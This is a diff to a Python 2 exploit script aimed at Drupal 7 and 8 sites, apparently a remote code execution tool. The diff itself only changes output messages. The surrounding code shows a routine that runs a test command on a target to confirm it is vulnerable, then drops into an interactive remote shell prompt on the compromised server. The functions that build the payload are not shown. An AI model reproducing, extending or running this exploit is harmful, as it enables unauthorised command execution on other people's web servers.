@@ -52,13 +52,13 @@ def rem_shell(domain, version, cmd):
 def testvuln(site):
 	try:
 		if get_output(send_cmd_v7(site, 'printf', 'ABCZ\n')) == 'ABCZ':
-			print "This server hosts a vulnerable Drupal v7     "
+			print "\rThis server hosts a vulnerable Drupal v7          "
 			return 7
 	except:
 		pass
 	try:
 		if get_output(send_cmd_v8(site, 'printf', 'ABCZ\n')) == 'ABCZ':
-			print "This server hosts a vulnerable Drupal v8     "
+			print "\rThis server hosts a vulnerable Drupal v8          "
 			return 8
 	except:
 		pass
@@ -77,13 +77,13 @@ if __name__ == "__main__":
 	print '#                                                          #'
 	print '############################################################\n'
 	dmn = target.split("://")[1]
-	print "Testing",dmn,"WAIT ...\r",
+	print "Testing",dmn,"WAIT ...",
 	version = testvuln(target)
 	if version != 8 and version != 7:
-		print "This server doesn't host a vulnerable Drupal     "
+		print "\rThis server doesn't host a vulnerable Drupal          "
 		sys.exit()
 	print "Connected to",dmn
-	print "# CTRL+D RETURN to quit\n"
+	print "# CTRL+D to quit\n"
 	while True:
 		cmd = raw_input("[drupal@"+dmn+" ~]#")
 		if cmd == "\x04":
